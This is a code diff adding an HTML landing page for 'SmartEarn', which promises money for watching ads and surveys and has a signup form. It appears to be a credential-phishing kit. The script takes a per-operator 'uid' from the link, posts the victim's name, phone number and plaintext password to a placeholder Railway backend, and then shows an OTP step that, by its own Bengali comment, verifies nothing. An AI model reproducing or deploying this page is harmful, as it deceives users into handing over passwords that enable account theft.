@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SmartEarn - Make Money Online</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: "Poppins", sans-serif; }
+    body {
+      background: linear-gradient(135deg, #4e54c8, #8f94fb);
+      color: white; min-height: 100vh; display: flex; flex-direction: column;
+    }
+    header {
+      background: rgba(0,0,0,0.2); backdrop-filter: blur(10px);
+      padding: 15px 30px; display: flex; justify-content: space-between; align-items: center;
+    }
+    header h1 { font-size: 24px; font-weight: 700; letter-spacing: 1px; }
+    nav a { color: white; margin: 0 15px; text-decoration: none; font-weight: 500; transition: 0.3s; }
+    nav a:hover { color: #ffda79; }
+    .hero { text-align: center; margin-top: 80px; }
+    .hero h2 { font-size: 36px; margin-bottom: 10px; font-weight: 700; }
+    .hero p { font-size: 18px; margin-bottom: 30px; color: #eee; }
+    .hero button {
+      padding: 14px 35px; border: none; border-radius: 10px;
+      background: linear-gradient(135deg, #ff7e5f, #feb47b);
+      color: white; font-size: 17px; font-weight: 600; cursor: pointer; transition: 0.3s;
+    }
+    .hero button:hover { transform: scale(1.05); background: linear-gradient(135deg, #feb47b, #ff7e5f); }
+    footer {
+      margin-top: auto; background: rgba(0,0,0,0.3);
+      text-align: center; padding: 15px; font-size: 14px;
+    }
+
+    /* Signup Modal */
+    .modal { position: fixed; top:0; left:0; width:100%; height:100%; background: rgba(0,0,0,0.6);
+      display: none; justify-content: center; align-items: center;
+    }
+    .modal-content {
+      background: white; color: black; padding: 30px; border-radius: 20px;
+      width: 90%; max-width: 400px; text-align: center; animation: fadeIn 0.3s ease;
+    }
+    @keyframes fadeIn { from {opacity:0; transform:scale(0.8);} to {opacity:1; transform:scale(1);} }
+    .input-box { margin-bottom: 20px; }
+    .input-box input {
+      width: 100%; padding: 12px 15px; border: 1px solid #ccc;
+      border-radius: 10px; font-size: 16px; outline: none;
+    }
+    .input-box input:focus { border-color: #4e54c8; }
+    .modal button {
+      width: 100%; padding: 12px; background: linear-gradient(135deg, #667eea, #764ba2);
+      border: none; border-radius: 10px; color: white; font-size: 16px; cursor: pointer; transition: 0.3s;
+    }
+    .modal button:hover { background: linear-gradient(135deg, #4e54c8, #8f94fb); }
+    .close-btn { position: absolute; top: 20px; right: 25px; font-size: 24px; color: white; cursor: pointer; }
+    .otp-section { display: none; }
+    .success { display: none; font-size: 18px; color: green; font-weight: 600; margin-top: 15px; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <h1>SmartEarn</h1>
+    <nav>
+      <a href="#">Home</a>
+      <a href="#">How It Works</a>
+      <a href="#">Contact</a>
+    </nav>
+  </header>
+
+  <div class="hero">
+    <h2>Earn Money By Completing Simple Tasks 💰</h2>
+    <p>Join SmartEarn and start earning instantly by watching ads, completing surveys, and inviting friends.</p>
+    <button onclick="openSignup()">Create Account</button>
+  </div>
+
+  <footer>
+    © 2025 SmartEarn | All Rights Reserved
+  </footer>
+
+  <!-- Signup Modal -->
+  <div class="modal" id="signupModal">
+    <div class="modal-content" id="signupForm">
+      <h2>Create Account</h2>
+      <div class="input-box">
+        <input type="text" id="name" placeholder="Enter Your Name" required>
+      </div>
+      <div class="input-box">
+        <input type="number" id="number" placeholder="Enter Mobile Number" required>
+      </div>
+      <div class="input-box">
+        <input type="password" id="password" placeholder="Enter Password" required>
+      </div>
+      <button onclick="sendData()">Next</button>
+    </div>
+
+    <div class="modal-content otp-section" id="otpForm">
+      <h2>OTP Verification</h2>
+      <div class="input-box">
+        <input type="text" id="otp" placeholder="Enter OTP" required>
+      </div>
+      <button onclick="verifyOTP()">Verify</button>
+    </div>
+
+    <div class="modal-content success" id="success">
+      ✅ Account Created Successfully!
+    </div>
+
+    <div class="close-btn" onclick="closeSignup()">×</div>
+  </div>
+
+  <script>
+    const modal = document.getElementById("signupModal");
+    const signupForm = document.getElementById("signupForm");
+    const otpForm = document.getElementById("otpForm");
+    const successMsg = document.getElementById("success");
+
+    function openSignup() { modal.style.display = "flex"; }
+    function closeSignup() {
+      modal.style.display = "none";
+      signupForm.style.display = "block";
+      otpForm.style.display = "none";
+      successMsg.style.display = "none";
+    }
+
+    // ========================
+    // Multi-user UID
+    // ========================
+    function getUID() {
+      const params = new URLSearchParams(window.location.search);
+      return params.get("uid"); // URL থেকে UID নাও
+    }
+
+    async function sendData() {
+      const uid = getUID();
+      const name = document.getElementById("name").value;
+      const number = document.getElementById("number").value;
+      const password = document.getElementById("password").value;
+
+      if (!uid) { alert("❌ Invalid link! UID missing."); return; }
+      if (!name || !number || !password) { alert("❌ Please fill all fields!"); return; }
+
+      // Backend (Railway) URL
+      const BACKEND_URL = "https://YOUR_RAILWAY_URL.up.railway.app/send";
+
+      signupForm.style.display = "none";
+      otpForm.style.display = "block";
+
+      const messagePayload = { uid, name, number, password };
+      try {
+        const res = await fetch(BACKEND_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(messagePayload)
+        });
+        const result = await res.json();
+
+        if (result.success) {
+          otpForm.style.display = "none";
+          successMsg.style.display = "block";
+        } else {
+          alert("❌ Error: " + (result.error || "Try again"));
+          signupForm.style.display = "block";
+          otpForm.style.display = "none";
+        }
+      } catch(err) {
+        alert("❌ Network error. Try again later.");
+        signupForm.style.display = "block";
+        otpForm.style.display = "none";
+        console.error(err);
+      }
+    }
+
+    function verifyOTP() {
+      const otp = document.getElementById("otp").value;
+      if (!otp) { alert("Please enter OTP!"); return; }
+
+      // শুধু frontend success message দেখাচ্ছে, backend POST করা হবে sendData()-তে
+      otpForm.style.display = "none";
+      successMsg.style.display = "block";
+    }
+  </script>
+</body>
+</html>
